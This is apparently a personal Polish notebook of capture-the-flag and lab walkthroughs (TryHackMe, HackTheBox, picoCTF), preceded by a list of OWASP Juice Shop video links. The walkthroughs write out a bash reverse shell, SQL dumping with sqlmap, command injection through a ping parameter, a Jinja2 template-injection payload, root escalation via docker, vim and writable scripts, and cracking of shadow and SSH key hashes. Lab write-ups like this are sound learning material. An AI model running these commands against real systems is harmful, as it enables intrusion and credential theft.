OWASP JUICE SHOP:
Zero Stars](https://youtu.be/0YSNRz0NRt8)
* [‚òÖ Confidential Document](https://youtu.be/Yi7OiMtzGXc)
* [‚òÖ DOM XSS](https://youtu.be/BuVxyBo05F8)
* [‚òÖ Error Handling](https://youtu.be/WGafQnjSMk4)
* [‚òÖ Missing Encoding](https://youtu.be/W7Bt2AmYtao)
* [‚òÖ Outdated Allowlist](https://youtu.be/TEdZAXuTfpk)
* [‚òÖ Privacy Policy](https://youtu.be/f5tM_4vBq-w)
* [‚òÖ Repetitive Registration](https://youtu.be/mHjYOtKGYQM)
* [‚òÖ‚òÖ Login Admin](https://youtu.be/LuU1fSuc7Gg)
* [‚òÖ‚òÖ Admin Section](https://youtu.be/BPLhu354esc)
* [‚òÖ‚òÖ Classic Stored XSS](https://youtu.be/dxzU6djocJQ)
* [‚òÖ‚òÖ Deprecated Interface](https://youtu.be/yQ40B_eSj48)
* [‚òÖ‚òÖ Five Star Feedback](https://youtu.be/9BsfRJA_-ik)
* [‚òÖ‚òÖ Login MC SafeSearch](https://youtu.be/8VhGBdVK9ik)
* [‚òÖ‚òÖ Password Strength](https://youtu.be/fnuz-3QM8ac)
* [‚òÖ‚òÖ Security Policy](https://youtu.be/_h829JTNtKo)
* [‚òÖ‚òÖ View Basket](https://youtu.be/hBbdxn3-aiU)
* [‚òÖ‚òÖ Weird Crypto](https://youtu.be/GWJouiMUJno)
* [‚òÖ‚òÖ‚òÖ API-Only XSS](https://youtu.be/aGjLR4uc0ys)
* [‚òÖ‚òÖ‚òÖ Admin Registration](https://youtu.be/-H3Ngs-S0Ms)
* [‚òÖ‚òÖ‚òÖ Bj√∂rn's Favorite Pet](https://youtu.be/a0k465G8Zkc)
* [‚òÖ‚òÖ‚òÖ Captcha Bypass](https://youtu.be/pgGVVOhIiaM)
* [‚òÖ‚òÖ‚òÖ Client-side XSS Protection](https://youtu.be/bNjsjs0T0_k)
* [‚òÖ‚òÖ‚òÖ Database Schema](https://youtu.be/0-D-e66U2Z0)
* [‚òÖ‚òÖ‚òÖ Forged Feedback](https://youtu.be/99iKTSkZ814)
* [‚òÖ‚òÖ‚òÖ Forged Review](https://youtu.be/k2abfhtuU9c)
* [‚òÖ‚òÖ‚òÖ GDPR Data Erasure](https://youtu.be/zBTYSpp41u8)
* [‚òÖ‚òÖ‚òÖ Login Amy](https://youtu.be/ICln3xcVxzI)
* [‚òÖ‚òÖ‚òÖ Login Bender](https://youtu.be/a6kh9fL77A0)
* [‚òÖ‚òÖ‚òÖ Login Jim](https://youtu.be/zJpJibswGWA)
* [‚òÖ‚òÖ‚òÖ Manipluate Basket](https://youtu.be/pdtDtmIiSOQ)
* [‚òÖ‚òÖ‚òÖ Payback Time](https://youtu.be/QN4f00VsXn4)
* [‚òÖ‚òÖ‚òÖ Privacy Policy Inspection](https://youtu.be/5DUXTmp5KbI)
* [‚òÖ‚òÖ‚òÖ Product Tampering](https://youtu.be/G4UKdotkyu8)
* [‚òÖ‚òÖ‚òÖ Reset Jim's Password](https://youtu.be/qYVlxeKVhgA)
* [‚òÖ‚òÖ‚òÖ Upload Size](https://youtu.be/5pcAPUihhWA)
* [‚òÖ‚òÖ‚òÖ Upload Type](https://youtu.be/4FPyMdyVt2s)
* [‚òÖ‚òÖ‚òÖ‚òÖ Access Log (Sensitive Data Exposure)](https://youtu.be/RBTfGk-ZwnY)
* [‚òÖ‚òÖ‚òÖ‚òÖ Ephemeral Accountant (SQL-Injection)](https://youtu.be/rD-_fRDHf9o)
* [‚òÖ‚òÖ‚òÖ‚òÖ Expired Coupon (Improper Input Validation)](https://youtu.be/4cWTUdTvTZg)
* [‚òÖ‚òÖ‚òÖ‚òÖ Forgotten Developer Backup (Sensitive Data Exposure)](https://youtu.be/YvkuVZ6r2Rg)
* [‚òÖ‚òÖ‚òÖ‚òÖ Forgotten Sales Backup (Sensitive Data Exposure)](https://youtu.be/5g4WRASni6g)
* [‚òÖ‚òÖ‚òÖ‚òÖ GDPR Data Theft (Sensitive Data Exposure)](https://youtu.be/GPW90c4Ahbc)
* [‚òÖ‚òÖ‚òÖ‚òÖ Legacy Typosquatting (Vulnerable Components)](https://youtu.be/HqkGeWtwiHY)
* [‚òÖ‚òÖ‚òÖ‚òÖ Login Bjoern (Broken Authentication)](https://youtu.be/pmBJ1ZAlpF8)
* [‚òÖ‚òÖ‚òÖ‚òÖ Misplaced Signature File (Sensitive Data Exposure)](https://youtu.be/56qHiwxTjYY)
* [‚òÖ‚òÖ‚òÖ‚òÖ Nested Easter Egg (Cryptographic Issues)](https://youtu.be/yvatrnWvcGE)
* [‚òÖ‚òÖ‚òÖ‚òÖ NoSql Manipulation (Injection)](https://youtu.be/frymuDxKwmc)
:broken_heart:
* [‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ Change Benders Password (Broken Authentication)](https://youtu.be/J3BSi-z9_7I)
* [‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ Extra Language (Broken Anti Automation)](https://youtu.be/KU2LzxABetk)
* [Broken Authentication and SQL Injection - OWASP Juice Shop TryHackMe](https://youtu.be/W4MXUnZB2jc)
by
[Motasem Hamdan - CyberSecurity Trainer](https://www.youtube.com/channel/UCNSdU_1ehXtGclimTVckHmQ)
* Live Hacking von Online-Shop ‚ÄûJuice Shop‚Äù (:de:)
[Twitch live stream](https://www.twitch.tv/GregorBiswanger) recordings by
[Gregor Biswanger](https://www.youtube.com/channel/UCGMA9qDbIQ-EhgLD-ZrsHWw)
(üßÉ`v11.x`)
* [Level 1](https://youtu.be/ccy-eKYpdbk)
* [Level 2](https://youtu.be/KtMPEDJx0Sg)
* [Level 3](https://youtu.be/aqXfFVHJ91g)
* [Level 4](https://youtu.be/jfe-iEePlTc)
* [HackerOne #h1-2004 Community Day: Intro to Web Hacking - OWASP Juice Shop](https://youtu.be/KmlwIwG7Kv4)
by [Nahamsec](https://twitch.tv/nahamsec) including the creation of a
(fake) bugbounty report for all findings (üßÉ`v10.x`)
* [TryHackme - JuiceShop Walkthrough](https://youtu.be/3yYNvRVlKmo) by
[Profesor Parno](https://www.youtube.com/channel/UCcBThq4OKjox_kfPkG1BF0Q)
(üßÉ`v8.x`, üáÆüá©)
* [OWASP Juice Shop All Challenges Solved || ETHIKERS](https://youtu.be/Fjdhf6OHgRk)
full-spoiler, time-lapsed, no-commentary hacking trip (üßÉ`v8.x`)
* [Hacking JavaScript - Intro to Hacking Web Apps (Episode 3)](https://youtu.be/ejB1i5n_d7o)
by Arthur Kay (üßÉ`v8.x`)
* [HackerSploit](https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q)
Youtube channel (üßÉ`v7.x`)
* [OWASP Juice Shop - SQL Injection](https://youtu.be/nH4r6xv-qGg)
* [Web App Penetration Testing - #15 - HTTP Attributes (Cookie Stealing)](https://youtu.be/8s3ChNKU85Q)
* [Web App Penetration Testing - #14 - Cookie Collection & Reverse Engineering](https://youtu.be/qtr0qtptYys)
* [Web App Penetration Testing - #13 - CSRF (Cross Site Request Forgery)](https://youtu.be/TwG0Rd0hr18)
* [How To Install OWASP Juice Shop](https://youtu.be/tvNKp1QXV_8)
* [7 Minute Security](https://7ms.us) Podcast (üßÉ`v2.x`)
* Episode #234:
[7MS #234: Pentesting OWASP Juice Shop - Part 5](https://7ms.us/7ms-234-pentesting-owasp-juice-shop-part5/)
([Youtube](https://www.youtube.com/watch?v=lGVAXCfFwv0))
* Episode #233:
[7MS #233: Pentesting OWASP Juice Shop - Part 4](https://7ms.us/7ms-233-pentesting-owasp-juice-shop-part-4/)
([Youtube](https://www.youtube.com/watch?v=1hhd9EwX7h0))
* Episode #232:
[7MS #232: Pentesting OWASP Juice Shop - Part 3](https://7ms.us/7ms-232-pentesting-owasp-juice-shop-part-3/)
([Youtube](https://www.youtube.com/watch?v=F8iRF2d-YzE))
* Episode #231:
[7MS #231: Pentesting OWASP Juice Shop - Part 2](https://7ms.us/7ms-231-pentesting-owasp-juice-shop-part-2/)
([Youtube](https://www.youtube.com/watch?v=523l4Pzhimc))
* Episode #230:
[7MS #230: Pentesting OWASP Juice Shop - Part 1](https://7ms.us/7ms-230-pentesting-owasp-juice-shop-part-1/)
([Youtube](https://www.youtube.com/watch?v=Cz37iejTsH4))
* Episode #229:
[7MS #229: Intro to Docker for Pentesters](https://7ms.us/7ms-229-intro-to-docker-for-pentesters/)
([Youtube](https://youtu

strings jaki≈õplik

strony do nauki / ƒáwiczenia:
https://ringzer0ctf.com/
https://bugcrowd.com/
https://blueteamlabs.online/
https://cyberdefenders.org/
**https://app.letsdefend.io/**

https://0xrick.github.io/misc/c2/
https://stackoverflow.com/
https://breached.to/
https://medium.com/mitre-attack
https://tryharder.jorgetesta.tech/
https://hunter.jorgetesta.tech/
**https://learn.noxtal.com/**

Je≈õli umie≈õcimy to na poczƒÖtku i umie≈õcimy pojedyncze cudzys≈Çowy wok√≥≈Ç odwr√≥conej pow≈Çoki z Reverse Shell, mo≈ºe to zadzia≈Çaƒá.
- bash -c 'bash -i >& /dev/tcp/MY IP/9001 0>&1'

eskalacja uprawnie≈Ñ:
- sudo python3 -m http.server 80
- (na przejƒôtej maszynie) wget http://MOJE IP/linpeas.sh
- (na przejƒôtej maszynie) sudo chmod +x linpeas.sh
- (na przejƒôtej maszynie) ./linpeas.sh
- sudo bash
- python3 -c 'import pty; pty.spawn("/bin/bash")'
teraz mam roota

https://www.vulnhub.com/resources/

NMAP skanowaniwe - sudo nmap -sV -sC -A -O -T4 10.10.10.10

## CYBORG:
**≈Çamanie Hashu**:  john hash.txt --wordlist=rockyou.txt

**odtwarzanie kopi zapasowej za pomocƒÖ borgbackup**:
- borg list nazwa foldera z kopiƒÖ zapasowƒÖ
- mkdir test        #test to nazwa nowego foldera
- borg mount nazwa foldera test
- borg umount test              # rozmontowanie (usuniƒôcie) archiwum

**eskalacja uprawnie≈Ñ**:
- chmod 777 /etc/mp3backups/backup.sh
- echo "/bin/bash" > /etc/mp3backups/backup.sh
- sudo /etc/mp3backups/backup.sh
- cd /root


## REVENGE
 **strona ma na przyk≈Çad /products czyli http://10.10.10.10/products i po wpisaniu /1 (http://10.10.10.10/products/1') wyskakuje error to znaczy ≈ºe jest prawdopodobie podatna na SQL.**

python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch --dbs

**zrzucanie bazy danych** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWA tabeli --tables

**zrzucenie kolejnej zawarto≈õci** --> python3 sqlmap.py -u "http://10.10.10.10/products/1" --batch -D NAZWATABELI -T NAZWA KOLEJNEJ TABELI --dump (je≈ºeli chcƒô sprawdziƒá inne to te same komendy tylko muszƒô zmieniƒá nazy tabel)

ODSZYFROWANIE HASH√ìW -->  cd                                                                   Desktop
john --wordlist=rockyou.txt PLIKZHASHAMI

**SPRAWDZANIE UPRAWNIE≈É NA ZHAKOWANYM SERWERZE**: sudo -l

ESKALACJA UPRAWNIE≈É:
**je≈ºeli U≈ºytkownik mo≈ºe edytowaƒá plik .service**:
```
sudoedit /etc/systemd/system/.service
```
wszystko usuwam i zostawiam tylko te komendy:![397a12abd70b704ce21cf3e883f705b0.png](:/b8a978f8f29e4f989e9dcca42913ddeb)
POTEM TRZEBA WPISAƒÜ TE 2 KOMENDY:
1. sudo systemctl daemon-reload
2. sudo systemctl restart .service
3. ls -lah /bin/bash
4. /bin/bash -p
5. id
6. ls -lah /root
7. zmiana nazwy zhakowanej strony --> nano /var/www/nazwastrony/templates/index.html ![41e10360e04b716ee139b1dcc208e7f0.png](:/751c19c0f689459883484c491cdae8f7)
8. cd /root

## UltraTech:

**nmap scan** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.238.142 (otwarte porty; 21,22,8081,31331) 

domeny dzia≈Ça≈Çy jedynie na 10.10.238.142:31331 oraz :8081

**dirbuster**  - znalaz≈Ç /js w 10.10.238.142:31331 oraz /ping w :8081
Poniewa≈º jest to us≈Çuga ping, zdecydowa≈Çem u≈ºyƒá parametru IP z adresem IP pƒôtli zwrotnej http://10.10.238.14/ping?ip=127.0.0.1

**EKSPLOATACJA**: http://10.10.213.191:8081/ping?ip='ls -la' 
po tym zapytaniu otrzyma≈Çem baze danych - utech.db.sqlite

**nastƒôpnie wpisa≈Çem**: http://10.10.213.191:8081/ping?ip=`cat%20utech.db.sqlite`
otrzyma≈Çem 2 hashe MD5 kt√≥re odszyfrowa≈Çem

(r00t to nazwa u≈ºytkownika)
≈ÅƒÑCZENIE: ssh r00t@10.10.213.191 
poda≈Çem has≈Ço
id

*ESKALACJA UPRAWNIE≈É ZA POMOCƒÑ DOCKERA POSIADANEGO NA ZAATAKOWANEJ MASZYNIE**

**KOMENDY** :docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
docker ps -a 
docker run -v /:/mnt --rm -it bash chroot /mnt sh 
whoami 

**prywatny klucz SSH**: cat /root/.ssh/id_rsa


## BRUTE IT:
**nmap** - sudo nmap -Pn -sV -sC -A -O -T4 --open -p- 1-65535 10.10.79.22

**BRUTE FORCE ZA POMOCA BURP SUITE:** https://portswigger.net/support/using-burp-to-brute-force-a-login-page

po z≈Çamaniu has≈Ça zdoby≈Çem prywatny klucz RSA: **wget http://MACHINE_IP/admin/panel/id_rsa**

**DESZYFROWANIE**: /usr/share/john/ssh2john.py id_rsa > idrsa.txt
john idrsa.txt --wordlist=rockyou.txt

**≈ÅƒÑCZENIE**:  ssh john@MACHINE_IP -i id_rsa

**ESKALACJA UPRAWNIE≈É:**  sudo -l 
- Sprawdzanie w GTFObins, czy mo≈ºemy wykorzystaƒá /bin/cat, czy nie. Tak, /bin/cat mo≈ºna wykorzystaƒá.
- mo≈ºemy uzyskaƒá dostƒôp do /etc/shadow, kt√≥ry zawiera u≈ºytkownik√≥w systemu i has≈Ça.
- Utw√≥rz plik o nazwie ‚Äûhashes‚Äù i skopiuj zawarto≈õƒá pliku shadow w postaci skr√≥t√≥w i u≈ºywajƒÖc johna do z≈Çamania skr√≥t√≥w
- john hashes --wordlist=rockyou.txt
- su root
- cd root


Zawsze sprawdzaj:

Kapitalizacja
Kodowanie znak√≥w
Ko≈Ñcowe spacje/nowe wiersze
Formaty daty/czasu
Formaty adres√≥w szesnastkowych (0x0042 vs 0042 vs 00000042)


## CTF Wonderland

Pierwsza flaga: Skan nmapem, pokaza≈Ç port 22 SSH, po skanie dirbusterem znalaz≈Çem katalog r/a/b/b/i/t a w kodzie ≈∫rud≈Çowym by≈Ça nazwa i has≈Ço (alice:pass) rzecz jasna by≈Ço to logowanie do ssh bo nie by≈Ço ≈ºadnego innego panelu czy mo≈ºliwo≈õci, po≈ÇƒÖczenie przez: **ssh alice@10.10.10.10** pierwsza flaga by≈Ça przez tƒÖ komendƒô "cat /root/user.txt" a 2 w root.txt

sudo -l <-- znalezienie ≈ºe plik, ma uprawnienia  admina

eskalacja uprawnie≈Ñ --> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
<--

# hackthebox (python templates)

po podpowiedzi czyli dok≈ÇƒÖdnƒÖ wersjƒô pythona i serwer, po wyszukaniu znalaza≈Çem artyku≈Ç o luce Server-Side Template Injection (SSTI) https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

wykorzystany exploit (w url po / ) --> `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
i zamiast "id" mogƒô wpisaƒá co chcƒô (po id zobaczy≈Çem ≈ºe jestem rootem) czyli wpisa≈Çem ls, znalaz≈Çem flagƒô .txt, i po prostu wpisa≈Çƒôm "cat flag.txt"

|----------------------------------------------------------|
## (zawsze u≈ºywaƒá komendy ls -la wtedy poka≈ºe r√≥wnie≈º ukryte foldery i pliki)
|----------------------------------------------------------|

## Git Happens (tryhackme)

znaleziony directory .git

u≈ºy≈Çem narzƒôdzia GitDumper

**najpierw komenda w Dumperze**:  `./gitdumper.sh http://10.10.52.114/.git/ Clone`  
(Clone to folder w kt√≥rym sƒÖ zapisane wyniki)

**Potem Extractor**: .`/extractor.sh /home/kali/Desktop/Tools/GIT/GitTools/Dumper/Clone /home/kali/Desktop/Tools/GIT/GitTools/Extractor` 
pierwsza lini to lokalizacji plik√≥w z wyniku dumpstera
a 2 to tam gdzie ma zapisaƒá wyniki

Potem po przeszukaniu kilku folder√≥w znalaz≈Çem has≈Ço za pomocƒÖ tej komendy: `tail -n 20 index.html`
(r√≥wnie dobrze mog≈Çem po prostu u≈ºyƒá komendy cat ale z 1 jest lepszy wynik)

ctf - https://github.com/SamuraiWTF/samuraiwtf


## Simple CTF

znalezienie strony kt√≥ra by≈Ça dostƒôpna przez directory /simple

strona u≈ºywa≈Ça podatnej wersji cms
**(CVE-2019-9053)**

przer√≥bi≈Çem exploita z exploit-db z zwyk≈Çej wersji pythona na python3

**uruchomi≈Çem polecenie**: `python3 exploit.py -u http://10.10.213.147/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`

zdoby≈Çem nazwe u≈ºytkownika i has≈Ço. Dziƒôki kt√≥rym zalogowa≈Çem siƒô przez port 2222 (ssh) 
komenda: `ssh user@10.10.10.10 -p 2222`

znalaz≈Çem flagƒô usera

zauwa≈ºy≈Çƒôm ≈ºe mam uprawnienia: `/bin/bash/vim`

wyszuka≈Çem vim na stronie: https://gtfobins.github.io/gtfobins/vim/

**eskalacja uprawnie≈Ñ (z pomocƒÖ strony):**  komenda: `sudo vim -c ':!/bin/sh'`
cd root
i mam flagƒô

-------------------------------------------------------------------------------
## Pico CTF reverse enginnering
## nazwa: bbbbloat

1. cmod +x filename
2. ./filename
3. ltrace filename
4. strace filename
5. objdump -d filename
6. file filename
7. gdb filename
8. w≈ÇƒÖczam ghride > window > devined strings > klikam na whats my favorite number? czyli output programu (2 razy kliknƒÖƒá w fud zeby zobaczyƒá innƒÖ funkcjƒô) > wchodzƒô znowu w decompile i zmieniam nazwƒô z fud co≈õtam na main (po to ≈ºe to prawdopodobnie g≈Ç√≥wna funkcja) > jako i≈º nie ma ≈ºadnej innej funkcjie w tym kodzie jednie jaka jest moja ulubiona liczbƒÖ i to nie jest poprawne, to w kodzie widzƒô co≈õ takiego: local_48 = 0x86187 wiƒôc wpisa≈Çem 'python3' a w nim wklei≈Çem to: 0x86187 oraz dosta≈Çem takƒÖ odp: `549255` po w≈ÇƒÖczeniu programu i wklejeniu tego kodu, dosta≈Çem flagƒô.


## nazwa: file-run2 / file-run1

1. chmod +x filename
2. ./filename #odpowied≈∫ programu: Run this file with only one argument.
3. tre≈õƒá ctfa brzmia≈Ça tak: "Another program, but this time, it seems to want some input. What happens if you try to run it on the command line with input "Hello!"?"
4.  wiƒôc wpisa≈Çem ./run Hello! i dosta≈Çem flagƒô

file run1 dok≈ÇƒÖdnie to samo ale bez wpisywania Hello!, wystarczy≈Ço samo w≈ÇƒÖczenie programu

## nazwa: GDB Test Drive

w opisie odrazu by≈Ço rozwiƒÖzanie, jedyne co musia≈Çem zrobiƒá to wpisaƒá te komendy: 
   
- [ ]  `chmod +x gdbme`
- [ ]  `gdb gdbme`
- [ ] (gdb) `layout asm`
- [ ] (gdb) `break *(main+99)`
- [ ] (gdb) `run`
- [ ] (gdb) `jump *(main+104)`

## nazwa: patchme flag

ctf zawiera≈Ç zaszyfrowany plik i kod pythona ten: 

```
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "ak98" + \
                   "-=90" + \
                   "adfjhgj321" + \
                   "sleuth9000"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), "utilitarian")
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```

po przeanalizowaniu kodu mo≈ºna zobaczyƒá ≈ºe kod dekoduje zaszyfrowany plik kt√≥y ma flae (funkcja decryption = str_xor(flag_enc.decode)). wystarczy tylko wpisaƒá has≈Ço kt√≥re widaƒá w user_pw. po dodaniu wszystkiego razem wychodzi takie has≈Ço: "ak98-=90adfjhgj321sleuth9000" po wpisaniu has≈Ça w progamie mam flagƒô.



## nazwa: findme

u≈ºy≈Çem burpsuite do zobaczenia parametr√≥w po zalogowaniu siƒô na konto by≈Ço  przekierowanie: ""/next-page/id=cGljb0NURntwcm94aWVzX2Fs" po zobaczeniu kodu widzia≈Çem to:         
``` setTimeout(function () {
           // after 2 seconds
           window.location = "/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==";
        }, 0.5)
```

czyli po 2 sekundach przekierowuje dodirecotry /home. jednak jak mo≈ºna zonbaczyƒá po znakach == na ko≈Ñcu jest to zakodowane przez base64. wiƒôc po dodaniu pierwszej czƒô≈õci i 2 wychodzi co≈õtakiego: cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==

odszyforwa≈Çem to tƒÖ komendƒÖ i zobaczy≈Çem flagƒô:
`echo 'cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==' | base64 -d`

## nazwa: unpackme

to by≈Ç plik .upx > wiƒôc go od pakowa≈Çem tym poleceniem: upx -d filename.upx

nasƒôpnie u≈ºy≈Çem ghridy, i w wyszukiwarce po lewej stronie wyszuka≈Çem s≈Çowo "main"

to jest czƒô≈õc kodu tego main:  

```
local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 5509350891791333953;
  local_30 = 0x30623e306b6d4146;
  local_28 = 0x5f60643630486637;
  local_20 = 0x37666132;
  local_1c = 0x4e;
  printf("What\'s my favorite number? ");
  __isoc99_scanf(&DAT_004b3020,&local_44);
  if (local_44 == 0xb83cb) {
    local_40 = (char *)rotate_encrypt(0,&local_38);
    fputs(local_40,(FILE *)stdout);
    putchar(10);
    free(local_40);
  }
  else {
    puts("Sorry, that\'s not it!");
  }
```
jak mo≈ºna po kodzie wywnieoskowaƒá trzeba by≈Ço rozkodowaƒá"0xb83cb" odszyfrowa≈Çem to z u≈ºyciem komendy python3, wklei≈Çem has≈Ço do programu i otrzyma≈Çem flagƒô.
